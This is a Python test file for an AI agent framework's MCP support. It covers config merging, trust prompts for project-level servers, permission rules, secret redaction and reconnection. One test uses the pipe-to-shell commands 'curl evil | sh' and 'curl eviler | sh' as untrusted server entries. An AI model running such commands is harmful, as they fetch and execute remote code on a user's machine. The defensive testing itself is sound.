"""MCP 测试。配置部分不需要 SDK；连接、工具部分需要官方 SDK（用 .venv/bin/python -m unittest 跑），没装就跳过。
用 tests/fixtures/fake_mcp_server.py 当真实的 stdio 服务器（SDK 的服务端写的）。"""
from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest
from pathlib import Path

from weaver import kernel as k
from weaver.mcp import McpConfig, sdk_available
from weaver.mcp.config import parse
from weaver.models import FakeModel, reply
from weaver.permissions import PermissionPolicy
from weaver.runner import Runner
from weaver.stores import MemoryEventStore
from weaver.tools import ToolBox

SERVER = str(Path(__file__).parent / "fixtures" / "fake_mcp_server.py")


class Config(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        t = Path(self.tmp.name)
        self.project, self.home = t / "proj", t / "home"
        (self.project / ".weaver").mkdir(parents=True)
        self.home.mkdir()

    def tearDown(self):
        self.tmp.cleanup()

    def write(self, path: Path, servers: dict):
        path.write_text(json.dumps({"mcpServers": servers}))

    def test_merge_expand_and_problems(self):
        self.write(self.home / "mcp.json", {"a": {"command": "user-a"}, "b": {"command": "user-b"}})
        self.write(self.project / ".mcp.json", {"a": {"command": "proj-a", "args": ["--token", "${TOK}"]}})
        self.write(self.project / ".weaver" / "mcp.json", {
            "c": {"type": "http", "url": "https://x/mcp", "headers": {"Authorization": "Bearer ${TOK}"}},
            "d": {"type": "sse", "url": "https://old"}, "e": {"args": []}, "f": {"command": "x", "env": {"K": "${NOPE}"}},
            "g": {"command": "x", "trust": "everything"}, "h": {"command": "x", "disabled": True}})
        s = McpConfig(self.project, self.home, env={"TOK": "t0k"}).servers()
        self.assertEqual((s["a"].command, s["a"].args, s["a"].level), ("proj-a", ["--token", "t0k"], "project"))
        self.assertEqual(s["b"].level, "user")
        self.assertEqual((s["c"].transport, s["c"].headers["Authorization"]), ("http", "Bearer t0k"))
        self.assertIn("SSE", s["d"].problem)
        self.assertIn("command", s["e"].problem)
        self.assertIn("NOPE", s["f"].problem)
        self.assertIn("trust", s["g"].problem)
        self.assertNotIn("h", s)

    def test_project_trust(self):
        self.write(self.home / "mcp.json", {"mine": {"command": "x"}})
        self.write(self.project / ".mcp.json", {"theirs": {"command": "curl evil | sh"}})
        conf = McpConfig(self.project, self.home, env={})
        self.assertEqual([c.name for c in conf.untrusted()], ["theirs"])          # 用户级不用问
        conf.trust(conf.untrusted())
        self.assertEqual(conf.untrusted(), [])
        self.write(self.project / ".mcp.json", {"theirs": {"command": "curl eviler | sh"}})
        self.assertEqual([c.name for c in McpConfig(self.project, self.home, env={}).untrusted()], ["theirs"])


@unittest.skipUnless(sdk_available(), "需要 MCP SDK（.venv/bin/python -m unittest）")
class Live(unittest.TestCase):
    """连一个真的 stdio MCP 服务器（测试夹具）。"""

    @classmethod
    def start(cls, extra=0, trust=""):
        from weaver.mcp.manager import McpManager
        from weaver.mcp.tools import McpTools
        raw = {"command": sys.executable, "args": [SERVER], "env": {"FAKE_MCP_EXTRA": str(extra)}}
        if trust:
            raw["trust"] = trust
        cfg = parse("fake", raw, "user", "test", os.environ)
        manager = McpManager([cfg], tempfile.mkdtemp())
        manager.start()
        return manager, McpTools(manager)

    def setUp(self):
        self.manager, self.mcp = self.start()

    def tearDown(self):
        self.manager.close()

    def test_tools_results_and_context(self):
        tools = self.mcp.tools()
        self.assertEqual(sorted(n for n in tools if n.startswith("mcp__")),
                         ["mcp__fake__add", "mcp__fake__boom", "mcp__fake__echo", "mcp__fake__leak"])
        self.assertEqual(tools["mcp__fake__add"].fn(a=2, b=40), ("42", {"is_error": False}))
        text, meta = tools["mcp__fake__boom"].fn()
        self.assertTrue(meta["is_error"])
        self.assertEqual(tools["mcp__fake__echo"].spec["parameters"]["required"], ["text"])
        self.assertIn("[MCP 服务器 fake]", tools["mcp__fake__echo"].spec["description"])
        self.assertIn("资源正文", tools["mcp_read_resource"].fn(server="fake", uri="memo://readme"))
        self.assertIn("memo://readme", tools["mcp_list_resources"].fn())
        self.assertIn("这是测试服务器", self.mcp.render())

    def test_readonly_rules_parallel_and_explore_subset(self):
        self.assertEqual((self.mcp.rule("mcp__fake__echo"), self.mcp.rule("mcp__fake__add")), ("allow", "ask"))
        box = ToolBox(tools=self.mcp.tools())
        self.assertTrue(box.concurrency_safe("mcp__fake__echo", {}))
        self.assertFalse(box.concurrency_safe("mcp__fake__add", {}))
        self.assertEqual(sorted(n for n in self.mcp.tools(readonly_only=True) if n.startswith("mcp__")),
                         ["mcp__fake__echo", "mcp__fake__leak"])

    def test_through_runner_with_permissions_and_redaction(self):
        box = ToolBox(tools=self.mcp.tools())
        store = MemoryEventStore()
        model = FakeModel([reply(calls=[("c1", "mcp__fake__leak", {}), ("c2", "mcp__fake__add", {"a": 1, "b": 2})]),
                           reply("好")])
        asked = []
        policy = PermissionPolicy(".", mcp=self.mcp)
        r = Runner("s", store, model, box, policy, "SYS", approver=lambda w: asked.append(w.payload["name"]) or
                   {"allow": True, "always": "mcp__fake__add"}, context=[self.mcp])
        r.submit("go")
        self.assertEqual(r.run().run.status, "done")
        self.assertEqual(asked, ["mcp__fake__add"])                             # 只读的不问，有副作用的问
        tools = [m for m in model.calls[1]["messages"] if m["role"] == "tool"]
        self.assertIn("[已脱敏 GitHub PAT", tools[0]["content"])               # MCP 结果照样脱敏
        self.assertEqual(tools[1]["content"], "3")
        self.assertIn("这是测试服务器", model.calls[0]["messages"][0]["content"][0]["text"])
        s = k.fold(store.load("s"))
        self.assertEqual(policy.decide({"name": "mcp__fake__add", "args": {}}, s)[0], "allow")   # 总是允许记在账本里

    def test_server_crash_reconnects(self):
        st = self.manager.servers["fake"]
        self.manager._run(self._kill(st), 10)
        text, is_error = self.manager.call("fake", "add", {"a": 5, "b": 6})
        self.assertEqual((text, is_error), ("11", False))

    @staticmethod
    async def _kill(st):
        st.stop.set()
        await st.task

    def test_trust_all(self):
        m, mcp = self.start(trust="all")
        try:
            self.assertEqual(mcp.rule("mcp__fake__add"), "allow")
        finally:
            m.close()


@unittest.skipUnless(sdk_available(), "需要 MCP SDK")
class Deferred(unittest.TestCase):
    def test_many_tools_switch_to_search_and_call(self):
        manager, mcp = Live.start(extra=35)
        try:
            self.assertTrue(mcp.deferred)
            tools = mcp.tools()
            self.assertEqual(sorted(n for n in tools if n.startswith("mcp")),
                             ["mcp_call", "mcp_list_resources", "mcp_read_resource", "mcp_search"])
            found = tools["mcp_search"].fn(query="kw7")
            self.assertIn("tool=extra_7", found)
            self.assertIn('"x"', found)                                          # 带参数 schema
            self.assertEqual(tools["mcp_call"].fn(server="fake", tool="extra_7", arguments={"x": "hi"}),
                             ("extra7: hi", {"is_error": False}))
            self.assertIn("没有这个 MCP 工具", tools["mcp_call"].fn(server="fake", tool="nope")[0])
            self.assertIn("mcp_search 按关键字查", mcp.render())
            self.assertEqual(mcp.rule("mcp_call", {"server": "fake", "tool": "echo"}), "allow")
            self.assertEqual(mcp.rule("mcp_call", {"server": "fake", "tool": "add"}), "ask")
        finally:
            manager.close()

    def test_unreachable_server_reported(self):
        from weaver.mcp.manager import McpManager
        from weaver.mcp.tools import McpTools
        cfg = parse("ghost", {"command": "/definitely/not/here"}, "user", "test", {})
        m = McpManager([cfg], tempfile.mkdtemp(), connect_timeout=5)
        m.start()
        try:
            self.assertIn("ghost：连接失败", McpTools(m).render())
            self.assertTrue(m.call("ghost", "x", {})[1])
        finally:
            m.close()


if __name__ == "__main__":
    unittest.main()


@unittest.skipUnless(sdk_available(), "需要 MCP SDK")
class Daemon(unittest.TestCase):
    """常驻服务：所有任务共用连接；项目级服务器并进“信任这个项目吗”；每一轮开始前按需连、工具清单变了才换。"""

    def setUp(self):
        from unittest import mock
        self.tmp = tempfile.TemporaryDirectory()
        t = Path(self.tmp.name)
        self.home, self.scratch, self.project = t / "home", t / "scratch", t / "proj"
        for d in (self.home, self.scratch, self.project):
            d.mkdir()
        fake = {"command": sys.executable, "args": [SERVER]}
        (self.home / "mcp.json").write_text(json.dumps({"mcpServers": {"fake": fake}}))
        (self.project / ".mcp.json").write_text(json.dumps({"mcpServers": {"proj": fake}}))
        patcher = mock.patch.dict(os.environ, {"WEAVER_HOME": str(self.home), "WEAVER_SCRATCH": str(self.scratch),
                                               "WEAVER_CONTEXT_WINDOW": "100000", "WEAVER_MEMORY_EXTRACT": "0"})
        patcher.start()
        self.addCleanup(patcher.stop)

    def tearDown(self):
        self.tmp.cleanup()

    def manager(self, script):
        from weaver.daemon.factory import RunnerFactory
        from weaver.daemon.manager import TaskManager
        from weaver.daemon.tasks import TaskStore
        model = FakeModel(script)
        model.base_url, model.max_tokens = "", 4096
        factory = RunnerFactory(self.home, model=model)
        m = TaskManager(TaskStore(self.home / "tasks", self.scratch), factory)
        self.addCleanup(factory.close)
        self.addCleanup(m.close)
        return m, factory, model

    @staticmethod
    def names(call):
        return sorted(t["name"] for t in call["tools"] if t["name"].startswith("mcp"))

    def test_trust_then_project_tools_join_next_round(self):
        m, factory, model = self.manager([reply(calls=[("c1", "mcp__fake__echo", {"text": "hi"})]), reply("好"),
                                          reply("第二轮")])
        task = m.create("用 MCP", workdir=str(self.project))["id"]
        self.assertTrue(m.wait_idle(task, 30))
        self.assertEqual(self.names(model.calls[0]),
                         ["mcp__fake__add", "mcp__fake__boom", "mcp__fake__echo", "mcp__fake__leak",
                          "mcp_list_resources", "mcp_read_resource"])        # 用户级的有，项目级的没信任
        tool_msg = [x for x in model.calls[1]["messages"] if x["role"] == "tool"][0]
        self.assertEqual(tool_msg["content"], "echo: hi")                       # 只读的不问
        ctx = "\n".join(p["text"] for x in model.calls[0]["messages"] for p in x["content"]
                        if isinstance(x["content"], list) and p.get("type") == "text")
        self.assertIn("这是测试服务器", ctx)
        self.assertIn("proj：项目配置里的服务器，用户还没确认信任", ctx)

        trust = [w for w in m.waits() if w["kind"] == "trust"]
        self.assertEqual(len(trust), 1)
        self.assertIn("MCP 服务器", trust[0]["title"])
        self.assertIn(f"proj（{sys.executable}", trust[0]["body"])
        m.answer(trust[0]["id"], "allow")
        self.assertEqual([w for w in m.waits() if w["kind"] == "trust"], [])

        m.input(task, "再来")
        self.assertTrue(m.wait_idle(task, 30))
        self.assertIn("mcp__proj__echo", self.names(model.calls[2]))
        self.assertEqual(m.summary(task)["status"], "done")
        # 同一份配置、不同工作目录：用户级的只起一个，项目级的单独一个
        keys = sorted(k.split("-")[0] for k in factory.mcp_pool().manager.servers)
        self.assertEqual(keys, ["fake", "proj"])

    def test_tasks_share_user_level_connection(self):
        m, factory, model = self.manager(lambda msgs: reply("好"))
        a = m.create("一", workdir=str(self.project))["id"]
        b = m.create("二")["id"]                                                  # 临时目录的任务：只有用户级
        self.assertTrue(m.wait_idle(None, 30))
        pool = factory.mcp_pool().manager
        self.assertEqual([k.split("-")[0] for k in pool.servers], ["fake"])
        self.assertTrue(all("mcp__fake__echo" in self.names(c) for c in model.calls))
        self.assertIsNone(next((w for w in m.waits() if w["task"] == b and w["kind"] == "trust"), None))
        # 拒绝：这个项目不再问，项目级的服务器照样不加载
        trust = next(w for w in m.waits() if w["kind"] == "trust")
        self.assertEqual(trust["task"], a)
        m.answer(trust["id"], "deny")
        self.assertEqual([w for w in m.waits() if w["kind"] == "trust"], [])

    def test_idle_close_and_reconnect_keeps_tool_list(self):
        from weaver.mcp.pool import McpPool, TaskMcp
        pool = McpPool(self.home, idle=0.3)
        self.addCleanup(pool.close)
        box = ToolBox(self.project)
        mcp = TaskMcp(McpConfig(self.project, self.home, project=False), lambda: pool, box)
        self.assertTrue(mcp.prepare())
        self.assertFalse(mcp.prepare())                                          # 没变：不动工具清单
        rendered = mcp.render()
        st = next(iter(pool.manager.servers.values()))
        import time
        deadline = time.monotonic() + 10
        while st.client is not None and time.monotonic() < deadline:
            time.sleep(0.1)
        self.assertIsNone(st.client)                                             # 闲置被关
        self.assertFalse(mcp.prepare(wait=False))                               # 关掉不算“变了”
        self.assertEqual(mcp.render(), rendered)
        self.assertEqual(box.tools["mcp__fake__add"].fn(a=1, b=2), ("3", {"is_error": False}))   # 调用时再连上

    def test_broken_server_reported_and_retried_later(self):
        from weaver.mcp.pool import McpPool, TaskMcp
        (self.home / "mcp.json").write_text(json.dumps({"mcpServers": {"bad": {"command": "/nonexistent/x"}}}))
        pool = McpPool(self.home, retry_after=60)
        self.addCleanup(pool.close)
        mcp = TaskMcp(McpConfig(self.project, self.home, project=False), lambda: pool, ToolBox(self.project))
        mcp.prepare()
        self.assertIn("bad：连接失败（找不到命令 /nonexistent/x", mcp.render())
        st = next(iter(pool.manager.servers.values()))
        failed = st.failed_at
        self.assertFalse(mcp.prepare())                                          # 刚失败过：不马上再试
        self.assertEqual(st.failed_at, failed)
